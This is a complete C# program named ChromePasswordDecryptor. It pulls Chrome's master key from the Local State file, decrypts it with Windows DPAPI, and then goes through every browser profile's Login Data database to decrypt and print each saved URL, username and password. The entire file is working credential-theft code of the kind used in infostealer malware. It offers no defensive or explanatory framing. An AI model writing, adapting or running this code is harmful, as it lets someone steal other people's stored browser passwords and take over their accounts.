using System;
using System.IO;
using System.Text;
using System.Security.Cryptography;
using System.Runtime.Versioning;
using Newtonsoft.Json;
using Microsoft.Data.Sqlite;

class ChromePasswordDecryptor
{
    [SupportedOSPlatform("windows")] // Ensures this code is only supported on Windows
    static void Main()
    {
        try
        {
            // Step 1: Get the Chrome User Data directory
            string userDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data");

            // Step 2: Read Chrome's local state file to get the encryption key
            string localStatePath = Path.Combine(userDataPath, "Local State");
            string localStateJson = File.ReadAllText(localStatePath);
            dynamic? localState = JsonConvert.DeserializeObject(localStateJson);

            if (localState?.os_crypt?.encrypted_key == null)
            {
                throw new Exception("Failed to read or parse Chrome's Local State file.");
            }

            byte[] encryptedKey = Convert.FromBase64String((string)localState.os_crypt.encrypted_key);
            encryptedKey = encryptedKey[5..];  // Remove "DPAPI" prefix

            // Step 3: Decrypt the AES key using Windows DPAPI
            byte[] aesKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);

            // Step 4: Find all profile folders
            string[] profileFolders = Directory.GetDirectories(userDataPath, "Profile *");
            string defaultProfilePath = Path.Combine(userDataPath, "Default");
            string guestProfilePath = Path.Combine(userDataPath, "Guest Profile");
            string systemProfilePath = Path.Combine(userDataPath, "System Profile");

            profileFolders = [.. profileFolders, guestProfilePath, systemProfilePath];
            // Include the "Default" profile if it exists
            if (Directory.Exists(defaultProfilePath))
            {
                profileFolders = [.. profileFolders, defaultProfilePath];
            }

            // Step 5: Loop through each profile folder and extract login data
            foreach (string profileFolder in profileFolders)
            {
                string profileName = Path.GetFileName(profileFolder);
                Console.WriteLine($"\n=============== Profile: {profileName} ===============");

                string loginDataPath = Path.Combine(profileFolder, "Login Data");
                if (!File.Exists(loginDataPath))
                {
                    Console.WriteLine($"No 'Login Data' file found in profile: {profileName}");
                    continue;
                }

                // Copy the Login Data file to a temporary location
                string tempDb = Path.Combine(Path.GetTempPath(), $"ChromeLoginData.db");
                File.Copy(loginDataPath, tempDb, true);

                // Extract and decrypt stored passwords
                using var conn = new SqliteConnection($"Data Source={tempDb};");
                conn.Open();
                using var cmd = conn.CreateCommand();
                cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
                using var reader = cmd.ExecuteReader();
                while (reader.Read())
                {
                    string url = reader.GetString(0);
                    string username = reader.GetString(1);
                    byte[] encryptedPassword = (byte[])reader["password_value"];

                    string decryptedPassword = DecryptPassword(encryptedPassword, aesKey);

                    Console.WriteLine($"URL: {url}");
                    Console.WriteLine($"Username: {username}");
                    Console.WriteLine($"Password: {decryptedPassword}\n");
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }

    // Decrypt AES-GCM encrypted passwords
    private static string DecryptPassword(byte[] encryptedPassword, byte[] aesKey)
    {
        try
        {
            if (encryptedPassword.Length < 19 || encryptedPassword[0] != 118)  // Check for "v10"
                return "Unsupported encryption format";

            byte[] nonce = encryptedPassword[3..15]; // Extract nonce (12 bytes)
            byte[] ciphertext = encryptedPassword[15..^16]; // Extract ciphertext
            byte[] tag = encryptedPassword[^16..]; // Extract GCM Tag (last 16 bytes)

            using AesGcm aes = new(aesKey, 16);
            byte[] decryptedData = new byte[ciphertext.Length];
            aes.Decrypt(nonce, ciphertext, tag, decryptedData);
            return Encoding.UTF8.GetString(decryptedData);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Decryption failed: {ex.Message}");
            return "Decryption failed";
        }
    }
}